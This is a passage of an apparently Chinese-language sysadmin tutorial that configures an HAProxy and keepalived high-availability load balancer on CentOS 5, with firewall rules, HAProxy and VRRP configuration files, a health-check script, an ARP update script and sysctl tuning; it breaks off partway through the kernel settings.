<h4 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/iptables  <span class="comment">#编辑</span></span><br><span class="line"></span><br><span class="line">-A RH-Firewall-1-INPUT -d 224.0.0.18 -j ACCEPT  <span class="comment">#允许组播地址通信</span></span><br><span class="line"></span><br><span class="line">-A RH-Firewall-1-INPUT -p    vrrp    -j ACCEPT  <span class="comment">#允许VRRP（虚拟路由器冗余协）通信</span></span><br><span class="line"></span><br><span class="line">-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT  <span class="comment">#允许80端口通过防火墙</span></span><br><span class="line"></span><br><span class="line">:wq! <span class="comment">#保存退出</span></span><br><span class="line"></span><br><span class="line">/etc/init.d/iptables restart <span class="comment">#重启防火墙使配置生效</span></span><br></pre></td></tr></table></figure>

<h4 id="安装HAProxy"><a href="#安装HAProxy" class="headerlink" title="安装HAProxy"></a>安装HAProxy</h4><h6 id="创建HAProxy运行账户和组"><a href="#创建HAProxy运行账户和组" class="headerlink" title="创建HAProxy运行账户和组"></a>创建HAProxy运行账户和组</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd haproxy #添加haproxy组</span><br><span class="line"></span><br><span class="line">useradd -g haproxy haproxy -s /bin/false #创建nginx运行账户haproxy并加入到haproxy组，不允许haproxy用户直接登录系统</span><br></pre></td></tr></table></figure>

<h6 id="安装编译工具"><a href="#安装编译工具" class="headerlink" title="安装编译工具"></a>安装编译工具</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install  gcc gcc-c++ make openssl-devel kernel-devel</span><br></pre></td></tr></table></figure>

<h6 id="安装HAProxy-1"><a href="#安装HAProxy-1" class="headerlink" title="安装HAProxy"></a>安装HAProxy</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HAProxy下载地址：http://haproxy.1wt.eu/download/1.4/src/haproxy-1.4.24.tar.gz</span><br><span class="line"></span><br><span class="line">上传haproxy-1.4.24.tar.gz到/usr/<span class="built_in">local</span>/src目录中</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src <span class="comment">#进入软件包存放目录</span></span><br><span class="line"></span><br><span class="line">tar zxvf haproxy-1.4.24.tar.gz <span class="comment">#解压</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span>  haproxy-1.4.24  <span class="comment">#进入安装目录</span></span><br><span class="line"></span><br><span class="line">make  TARGET=linux26 CPU=x86_64  PREFIX=/usr/<span class="built_in">local</span>/haprpxy  <span class="comment">#编译</span></span><br><span class="line"></span><br><span class="line">make install PREFIX=/usr/<span class="built_in">local</span>/haproxy  <span class="comment">#安装</span></span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">TARGET=linux26</span><br><span class="line"></span><br><span class="line">\<span class="comment">#使用uname -r查看内核，如：2.6.18-371.el5，此时该参数就为linux26</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#kernel 大于2.6.28的用：TARGET=linux2628</span></span><br><span class="line"></span><br><span class="line">CPU=x86_64   <span class="comment">#使用uname -r查看系统信息，如x86_64 x86_64 x86_64 GNU/Linux，此时该参数就为x86_64</span></span><br><span class="line"></span><br><span class="line">PREFIX=/usr/<span class="built_in">local</span>/haprpxy   <span class="comment">#/usr/local/haprpxy为haprpxy安装路径</span></span><br></pre></td></tr></table></figure>

<h6 id="设置HAProxy"><a href="#设置HAProxy" class="headerlink" title="设置HAProxy"></a>设置HAProxy</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p  /usr/<span class="built_in">local</span>/haproxy/conf  <span class="comment">#创建配置文件目录</span></span><br><span class="line"></span><br><span class="line">mkdir -p /etc/haproxy  <span class="comment">#创建配置文件目录</span></span><br><span class="line"></span><br><span class="line">cp /usr/<span class="built_in">local</span>/src/haproxy-1.4.24/examples/haproxy.cfg  /usr/<span class="built_in">local</span>/haproxy/conf/haproxy.cfg  <span class="comment">#拷贝配置模板文件</span></span><br><span class="line"></span><br><span class="line">ln -s  /usr/<span class="built_in">local</span>/haproxy/conf/haproxy.cfg   /etc/haproxy/haproxy.cfg  <span class="comment">#添加配置文件软连接</span></span><br><span class="line"></span><br><span class="line">cp -r  /usr/<span class="built_in">local</span>/src/haproxy-1.4.24/examples/errorfiles  /usr/<span class="built_in">local</span>/haproxy/errorfiles  <span class="comment">#拷贝错误页面</span></span><br><span class="line"></span><br><span class="line">ln -s  /usr/<span class="built_in">local</span>/haproxy/errorfiles  /etc/haproxy/errorfiles  <span class="comment">#添加软连接</span></span><br><span class="line"></span><br><span class="line">mkdir -p  /usr/<span class="built_in">local</span>/haproxy/<span class="built_in">log</span>  <span class="comment">#创建日志文件目录</span></span><br><span class="line"></span><br><span class="line">touch  /usr/<span class="built_in">local</span>/haproxy/<span class="built_in">log</span>/haproxy.log  <span class="comment">#创建日志文件</span></span><br><span class="line"></span><br><span class="line">ln -s  /usr/<span class="built_in">local</span>/haproxy/<span class="built_in">log</span>/haproxy.log  /var/<span class="built_in">log</span>/haproxy.log  <span class="comment">#添加软连接</span></span><br><span class="line"></span><br><span class="line">cp /usr/<span class="built_in">local</span>/src/haproxy-1.4.24/examples/haproxy.init  /etc/rc.d/init.d/haproxy  <span class="comment">#拷贝开机启动文件</span></span><br><span class="line"></span><br><span class="line">chmod +x  /etc/rc.d/init.d/haproxy  <span class="comment">#添加脚本执行权限</span></span><br><span class="line"></span><br><span class="line">chkconfig haproxy on  <span class="comment">#设置开机启动</span></span><br><span class="line"></span><br><span class="line">ln -s  /usr/<span class="built_in">local</span>/haproxy/sbin/haproxy  /usr/sbin  <span class="comment">#添加软连接</span></span><br></pre></td></tr></table></figure>

<h6 id="配置haproxy-cfg参数"><a href="#配置haproxy-cfg参数" class="headerlink" title="配置haproxy.cfg参数"></a>配置haproxy.cfg参数</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp  /usr/<span class="built_in">local</span>/haproxy/conf/haproxy.cfg   /usr/<span class="built_in">local</span>/haproxy/conf/haproxy.cfg-bak  <span class="comment">#备份</span></span><br><span class="line"></span><br><span class="line">vim  /usr/<span class="built_in">local</span>/haproxy/conf/haproxy.cfg  <span class="comment">#编辑，修改</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#####################################################################</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># this config needs haproxy-1.1.28 or haproxy-1.2.1</span></span><br><span class="line"></span><br><span class="line">global</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span> 127.0.0.1   local0 <span class="comment">#在本机记录日志</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span> 127.0.0.1   local1 notice</span><br><span class="line"></span><br><span class="line">\<span class="comment">#log loghost    local0 info</span></span><br><span class="line"></span><br><span class="line">maxconn 65535   <span class="comment">#每个进程可用的最大连接数</span></span><br><span class="line"></span><br><span class="line">nbproc  8  <span class="comment">#进程数量，可以设置多个，提高处理效率</span></span><br><span class="line"></span><br><span class="line">chroot /usr/<span class="built_in">local</span>/haproxy  <span class="comment">#haproxy安装目录</span></span><br><span class="line"></span><br><span class="line">uid 500  <span class="comment">#运行haproxy的用户uid（cat /etc/passwd查看）</span></span><br><span class="line"></span><br><span class="line">gid 500  <span class="comment">#运行haproxy的组uid（cat /etc/group查看）</span></span><br><span class="line"></span><br><span class="line">daemon   <span class="comment">#以后台守护进程运行</span></span><br><span class="line"></span><br><span class="line">pidfile /usr/<span class="built_in">local</span>/haproxy/haproxy.pid  <span class="comment">#将所有进程写入pid文件</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#debug   #调试模式</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#quiet   #安装模式</span></span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line"></span><br><span class="line">\<span class="comment">#log     global</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>  127.0.0.1   local3  <span class="comment">#日志文件设置</span></span><br><span class="line"></span><br><span class="line">mode    http  <span class="comment">#运行模式tcp、http、health</span></span><br><span class="line"></span><br><span class="line">option  httplog</span><br><span class="line"></span><br><span class="line">option  http-pretend-keepalive  <span class="comment">#服务器端保持长连接</span></span><br><span class="line"></span><br><span class="line">option  http-server-close   <span class="comment">#每次请求完毕后主动关闭http通道</span></span><br><span class="line"></span><br><span class="line">option  forceclose    <span class="comment">#服务端响应后主动关闭请求连接，及早释放服务连接，不必等到客户端应答确认</span></span><br><span class="line"></span><br><span class="line">option  httpclose       <span class="comment">#每次请求完毕后主动关闭http通道</span></span><br><span class="line"></span><br><span class="line">option  accept-invalid-http-request       <span class="comment">#接受无效的http请求，一般建议不设置，但是可解决部分杂牌浏览器访问打不开页面问题</span></span><br><span class="line"></span><br><span class="line">option  dontlognull     <span class="comment">#不记录健康检查的日志信息</span></span><br><span class="line"></span><br><span class="line">option  redispatch  <span class="comment">#如果后端有服务器宕机，强制切换到正常服务器</span></span><br><span class="line"></span><br><span class="line">option  abortonclose  <span class="comment">#丢弃由于客户端等待时间过长而关闭连接但仍在haproxy等待队列中的请求</span></span><br><span class="line"></span><br><span class="line">option  forwardfor  except 127.0.0.0/8  <span class="comment">#不记录本机转发的日志</span></span><br><span class="line"></span><br><span class="line">option  originalto  <span class="comment">#记录客户端访问的目的IP</span></span><br><span class="line"></span><br><span class="line">maxconn  65535  <span class="comment">#每个进程可用的最大连接数</span></span><br><span class="line"></span><br><span class="line">balance <span class="built_in">source</span>  <span class="comment">#同一IP地址的所有请求都发送到同一服务器</span></span><br><span class="line"></span><br><span class="line">retries 3   <span class="comment">#三次连接失败，则判断服务不可用</span></span><br><span class="line"></span><br><span class="line">contimeout      5000  <span class="comment">#连接超时</span></span><br><span class="line"></span><br><span class="line">clitimeout      50000 <span class="comment">#客户端超时</span></span><br><span class="line"></span><br><span class="line">srvtimeout      50000 <span class="comment">#服务器超时</span></span><br><span class="line"></span><br><span class="line">timeout check 5s  <span class="comment">#检测超时</span></span><br><span class="line"></span><br><span class="line">timeout http-request 5s  <span class="comment">#http请求超时时间</span></span><br><span class="line"></span><br><span class="line">timeout queue 30s  <span class="comment">#一个请求在队列里的超时时间</span></span><br><span class="line"></span><br><span class="line">timeout http-keep-alive  5s  <span class="comment">#设置http-keep-alive的超时时间</span></span><br><span class="line"></span><br><span class="line">stats refresh 30s <span class="comment">#统计页面自动刷新时间</span></span><br><span class="line"></span><br><span class="line">stats uri  /haproxy-status  <span class="comment">#统计页面URL路径</span></span><br><span class="line"></span><br><span class="line">stats realm haproxy-status  <span class="comment">#统计页面输入密码框提示信息</span></span><br><span class="line"></span><br><span class="line">stats auth admin:123456     <span class="comment">#统计页面用户名和密码</span></span><br><span class="line"></span><br><span class="line">stats hide-version          <span class="comment">#隐藏统计页面上HAProxy版本信息</span></span><br><span class="line"></span><br><span class="line">frontend    web  <span class="comment">#自定义描述信息</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">bind</span> :80  <span class="comment">#监听80端口</span></span><br><span class="line"></span><br><span class="line">acl bbs.osyunwei.com  hdr(host) -i bbs.osyunwei.com  <span class="comment">#规则设置，-i后面是要访问的域名，如果访问bbs.osyunwei.com这个域名，就负载均衡到bbs.osyunwei.com作用域</span></span><br><span class="line"></span><br><span class="line">use_backend bbs.osyunwei.com <span class="keyword">if</span> bbs.osyunwei.com   <span class="comment">#acl和if后面的名称必须相同这里为bbs.osyunwei.com</span></span><br><span class="line"></span><br><span class="line">acl sns.osyunwei.com  hdr(host) -i sns.osyunwei.com  <span class="comment">#规则设置，-i后面是要访问的域名，如果访问sns.osyunwei.com这个域名，就负载均衡到sns.osyunwei.com作用域</span></span><br><span class="line"></span><br><span class="line">use_backend sns.osyunwei.com <span class="keyword">if</span> sns.osyunwei.com</span><br><span class="line"></span><br><span class="line">backend     bbs.osyunwei.com</span><br><span class="line"></span><br><span class="line">mode http</span><br><span class="line"></span><br><span class="line">balance   <span class="built_in">source</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#option  httpchk /index.php  #检测服务器此文件是否存在，如果没有，则认为服务器连接异常，此参数可以不设置</span></span><br><span class="line"></span><br><span class="line">server     192.168.21.127  192.168.21.127:80   check  inter  2000  rise 3  fall  3  weight 100   <span class="comment">#inter  2000 心跳检测时间；rise 3 三次连接成功，表示服务器正常；fall  3 三次连接失败，表示服务器异常； weight 100 权重设置</span></span><br><span class="line"></span><br><span class="line">server     192.168.21.128  192.168.21.128:80   check  inter  2000  rise 3  fall  3  weight 100</span><br><span class="line"></span><br><span class="line">backend     sns.osyunwei.com</span><br><span class="line"></span><br><span class="line">mode http</span><br><span class="line"></span><br><span class="line">balance   <span class="built_in">source</span>  <span class="comment">#设置负载均衡模式，source保存session值，roundrobin轮询模式</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#option  httpchk /index.php  #检测服务器此文件是否存在，如果没有，则认为服务器连接异常，此参数可以不设置</span></span><br><span class="line"></span><br><span class="line">server     192.168.21.127  192.168.21.127:80   check  inter  2000  rise 3  fall  3  weight 100</span><br><span class="line"></span><br><span class="line">server     192.168.21.128  192.168.21.128:80   check  inter  2000  rise 3  fall  3  weight 100</span><br><span class="line"></span><br><span class="line">\<span class="comment">#errorloc  503  http://www.osyunwei.com/404.html</span></span><br><span class="line"></span><br><span class="line">errorfile 403 /etc/haproxy/errorfiles/403.http</span><br><span class="line"></span><br><span class="line">errorfile 500 /etc/haproxy/errorfiles/500.http</span><br><span class="line"></span><br><span class="line">errorfile 502 /etc/haproxy/errorfiles/502.http</span><br><span class="line"></span><br><span class="line">errorfile 503 /etc/haproxy/errorfiles/503.http</span><br><span class="line"></span><br><span class="line">errorfile 504 /etc/haproxy/errorfiles/504.http</span><br><span class="line"></span><br><span class="line">\<span class="comment">#####################################################################</span></span><br><span class="line"></span><br><span class="line">:wq! <span class="comment">#保存退出</span></span><br><span class="line"></span><br><span class="line">service haproxy start <span class="comment">#启动</span></span><br><span class="line"></span><br><span class="line">service haproxy stop  <span class="comment">#关闭</span></span><br><span class="line"></span><br><span class="line">service haproxy restart  <span class="comment">#重启</span></span><br></pre></td></tr></table></figure>

<h6 id="设置HAProxy日志"><a href="#设置HAProxy日志" class="headerlink" title="设置HAProxy日志"></a>设置HAProxy日志</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/syslog.conf  <span class="comment">#编辑，在最下边增加</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># haproxy.log</span></span><br><span class="line"></span><br><span class="line">local0.*          /var/<span class="built_in">log</span>/haproxy.log</span><br><span class="line"></span><br><span class="line">local3.*          /var/<span class="built_in">log</span>/haproxy.log</span><br><span class="line"></span><br><span class="line">:wq! <span class="comment">#保存退出</span></span><br><span class="line"></span><br><span class="line">vi  /etc/sysconfig/syslog   <span class="comment">#编辑修改</span></span><br><span class="line"></span><br><span class="line">SYSLOGD_OPTIONS=<span class="string">"-r -m 0"</span>   <span class="comment">#接收远程服务器日志</span></span><br><span class="line"></span><br><span class="line">:wq! <span class="comment">#保存退出</span></span><br><span class="line"></span><br><span class="line">service syslog restart  <span class="comment">#重启syslog</span></span><br></pre></td></tr></table></figure>

<h4 id="安装keepalived"><a href="#安装keepalived" class="headerlink" title="安装keepalived"></a>安装keepalived</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下载keeplived：http://www.keepalived.org/software/keepalived-1.2.12.tar.gz</span><br><span class="line"></span><br><span class="line">上传keepalived-1.2.12.tar.gz到/usr/<span class="built_in">local</span>/src目录</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src</span><br><span class="line"></span><br><span class="line">tar zxvf keepalived-1.2.12.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> keepalived-1.2.12</span><br><span class="line"></span><br><span class="line">./configure  <span class="comment">#配置，必须看到以下提示，说明配置正确，才能继续安装</span></span><br><span class="line"></span><br><span class="line">Use IPVS Framework : Yes</span><br><span class="line"></span><br><span class="line">IPVS sync daemon support : Yes</span><br><span class="line"></span><br><span class="line">Use VRRP Framework       : Yes</span><br><span class="line"></span><br><span class="line">make <span class="comment">#编辑</span></span><br><span class="line"></span><br><span class="line">make install  <span class="comment">#安装</span></span><br><span class="line"></span><br><span class="line">cp /usr/<span class="built_in">local</span>/etc/sysconfig/keepalived  /etc/sysconfig/</span><br><span class="line"></span><br><span class="line">mkdir /etc/keepalived</span><br><span class="line"></span><br><span class="line">cp /usr/<span class="built_in">local</span>/etc/keepalived/keepalived.conf /etc/keepalived/</span><br><span class="line"></span><br><span class="line">cp /usr/<span class="built_in">local</span>/sbin/keepalived /usr/sbin/</span><br><span class="line"></span><br><span class="line">cp /usr/<span class="built_in">local</span>/etc/rc.d/init.d/keepalived  /etc/rc.d/init.d/</span><br><span class="line"></span><br><span class="line">chmod +x /etc/rc.d/init.d/keepalived  <span class="comment">#添加执行权限</span></span><br><span class="line"></span><br><span class="line">chkconfig keepalived on  <span class="comment">#设置开机启动</span></span><br><span class="line"></span><br><span class="line">service keepalived start <span class="comment">#启动</span></span><br><span class="line"></span><br><span class="line">service keepalived stop  <span class="comment">#关闭</span></span><br><span class="line"></span><br><span class="line">service keepalived restart  <span class="comment">#重启</span></span><br></pre></td></tr></table></figure>

<h6 id="配置keepalived"><a href="#配置keepalived" class="headerlink" title="配置keepalived"></a>配置keepalived</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/keepalived/keepalived.conf  /etc/keepalived/keepalived.conf-bak</span><br><span class="line"></span><br><span class="line">vi /etc/keepalived/keepalived.conf  <span class="comment">#编辑，修改为以下代码</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#以下为192.168.21.129服务器：</span></span><br><span class="line"></span><br><span class="line">! Configuration File <span class="keyword">for</span> keepalived</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line"></span><br><span class="line">notification_email &#123;</span><br><span class="line"></span><br><span class="line">acassen@firewall.loc</span><br><span class="line"></span><br><span class="line">failover@firewall.loc</span><br><span class="line"></span><br><span class="line">sysadmin@firewall.loc</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line"></span><br><span class="line">smtp_server 192.168.200.1</span><br><span class="line"></span><br><span class="line">smtp_connect_timeout 30</span><br><span class="line"></span><br><span class="line">router_id LVS_DEVEL</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_haproxy &#123;</span><br><span class="line"></span><br><span class="line">script <span class="string">"/etc/keepalived/check_haproxy.sh"</span>  <span class="comment">#HAproxy服务监控脚本</span></span><br><span class="line"></span><br><span class="line">interval 2</span><br><span class="line"></span><br><span class="line">weight 2</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line"></span><br><span class="line">state MASTER</span><br><span class="line"></span><br><span class="line">interface eth0</span><br><span class="line"></span><br><span class="line">virtual_router_id 51</span><br><span class="line"></span><br><span class="line">priority 100</span><br><span class="line"></span><br><span class="line">advert_int 1</span><br><span class="line"></span><br><span class="line">authentication &#123;</span><br><span class="line"></span><br><span class="line">auth_type PASS</span><br><span class="line"></span><br><span class="line">auth_pass 1111</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">track_script &#123;</span><br><span class="line"></span><br><span class="line">chk_haproxy <span class="comment">#监测haproxy进程状态</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_ipaddress &#123;</span><br><span class="line"></span><br><span class="line">192.168.21.253</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">notify_master <span class="string">"/etc/keepalived/clean_arp.sh  192.168.21.253"</span>  <span class="comment">#更新虚拟服务器（VIP）地址的arp记录到网关</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_2 &#123;</span><br><span class="line"></span><br><span class="line">state BACKUP</span><br><span class="line"></span><br><span class="line">interface eth0</span><br><span class="line"></span><br><span class="line">virtual_router_id 52</span><br><span class="line"></span><br><span class="line">priority 99</span><br><span class="line"></span><br><span class="line">advert_int 1</span><br><span class="line"></span><br><span class="line">authentication &#123;</span><br><span class="line"></span><br><span class="line">auth_type PASS</span><br><span class="line"></span><br><span class="line">auth_pass 1111</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_ipaddress &#123;</span><br><span class="line"></span><br><span class="line">192.168.21.254</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">notify_master <span class="string">"/etc/keepalived/clean_arp.sh  192.168.21.254"</span>  <span class="comment">#更新虚拟服务器（VIP）地址的arp记录到网关</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">\<span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line">:wq! <span class="comment">#保存退出</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#以下为192.168.21.130服务器：</span></span><br><span class="line"></span><br><span class="line">192.168.21.130</span><br><span class="line"></span><br><span class="line">! Configuration File <span class="keyword">for</span> keepalived</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line"></span><br><span class="line">notification_email &#123;</span><br><span class="line"></span><br><span class="line">acassen@firewall.loc</span><br><span class="line"></span><br><span class="line">failover@firewall.loc</span><br><span class="line"></span><br><span class="line">sysadmin@firewall.loc</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">notification_email_from Alexandre.Cassen@firewall.loc</span><br><span class="line"></span><br><span class="line">smtp_server 192.168.200.1</span><br><span class="line"></span><br><span class="line">smtp_connect_timeout 30</span><br><span class="line"></span><br><span class="line">router_id LVS_DEVEL</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_haproxy &#123;</span><br><span class="line"></span><br><span class="line">script <span class="string">"/etc/keepalived/check_haproxy.sh"</span>  <span class="comment">#HAproxy服务监控脚本</span></span><br><span class="line"></span><br><span class="line">interval 2</span><br><span class="line"></span><br><span class="line">weight 2</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line"></span><br><span class="line">state BACKUP</span><br><span class="line"></span><br><span class="line">interface eth0</span><br><span class="line"></span><br><span class="line">virtual_router_id 51</span><br><span class="line"></span><br><span class="line">priority 99</span><br><span class="line"></span><br><span class="line">advert_int 1</span><br><span class="line"></span><br><span class="line">authentication &#123;</span><br><span class="line"></span><br><span class="line">auth_type PASS</span><br><span class="line"></span><br><span class="line">auth_pass 1111</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">track_script &#123;</span><br><span class="line"></span><br><span class="line">chk_haproxy <span class="comment">#监测haproxy进程状态</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_ipaddress &#123;</span><br><span class="line"></span><br><span class="line">192.168.21.253</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">notify_master <span class="string">"/etc/keepalived/clean_arp.sh  192.168.21.253"</span>  <span class="comment">#更新虚拟服务器（VIP）地址的arp记录到网关</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_2 &#123;</span><br><span class="line"></span><br><span class="line">state MASTER</span><br><span class="line"></span><br><span class="line">interface eth0</span><br><span class="line"></span><br><span class="line">virtual_router_id 52</span><br><span class="line"></span><br><span class="line">priority 100</span><br><span class="line"></span><br><span class="line">advert_int 1</span><br><span class="line"></span><br><span class="line">authentication &#123;</span><br><span class="line"></span><br><span class="line">auth_type PASS</span><br><span class="line"></span><br><span class="line">auth_pass 1111</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_ipaddress &#123;</span><br><span class="line"></span><br><span class="line">192.168.21.254</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">notify_master <span class="string">"/etc/keepalived/clean_arp.sh  192.168.21.254"</span>  <span class="comment">#更新虚拟服务器（VIP）地址的arp记录到网关</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">\<span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line">:wq! <span class="comment">#保存退出</span></span><br></pre></td></tr></table></figure>

<h4 id="设置HAproxy服务监控脚本"><a href="#设置HAproxy服务监控脚本" class="headerlink" title="设置HAproxy服务监控脚本"></a>设置HAproxy服务监控脚本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/keepalived/check_haproxy.sh <span class="comment">#编辑，添加以下代码</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">A=`ps -C haproxy --no-header | wc -l`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$A</span> -eq 0 ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">then</span> service haproxy start</span><br><span class="line"></span><br><span class="line">sleep 3</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ `ps -C haproxy --no-header | wc -l ` -eq 0 ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">then</span> service keepalived stop</span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line">:wq! <span class="comment">#保存退出</span></span><br><span class="line"></span><br><span class="line">chmod +x /etc/keepalived/check_haproxy.sh   <span class="comment">#添加执行权限</span></span><br></pre></td></tr></table></figure>

<h4 id="设置更新虚拟服务器（VIP）地址的arp记录到网关脚本"><a href="#设置更新虚拟服务器（VIP）地址的arp记录到网关脚本" class="headerlink" title="设置更新虚拟服务器（VIP）地址的arp记录到网关脚本"></a>设置更新虚拟服务器（VIP）地址的arp记录到网关脚本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/keepalived/clean_arp.sh  <span class="comment">#编辑，添加以下代码</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">VIP=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">GATEWAY=192.168.21.2 <span class="comment">#网关地址</span></span><br><span class="line"></span><br><span class="line">/sbin/arping -I eth0 -c 5 -s <span class="variable">$VIP</span> <span class="variable">$GATEWAY</span> &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line">:wq!  <span class="comment">#保存退出</span></span><br><span class="line"></span><br><span class="line">chmod +x /etc/keepalived/clean_arp.sh  <span class="comment">#添加脚本执行权限</span></span><br></pre></td></tr></table></figure>

<h4 id="系统内核优化"><a href="#系统内核优化" class="headerlink" title="系统内核优化"></a>系统内核优化</h4><p>在两台HAProxy服务器上分别操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -i &quot;s/net.ipv4.ip_forward = 0/net.ipv4.ip_forward = 1/g&quot; &apos;/etc/sysctl.conf&apos;</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.core.somaxconn = 262144&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.core.netdev_max_backlog = 262144&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.core.wmem_default = 8388608&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.core.rmem_default = 8388608&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.core.rmem_max = 16777216&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.core.wmem_max = 16777216&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.route.gc_timeout = 20&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.ip_local_port_range = 1025 65535&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_retries2 = 5&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_fin_timeout = 30&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_syn_retries = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_synack_retries = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_timestamps = 0&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_tw_recycle = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_tw_reuse = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span 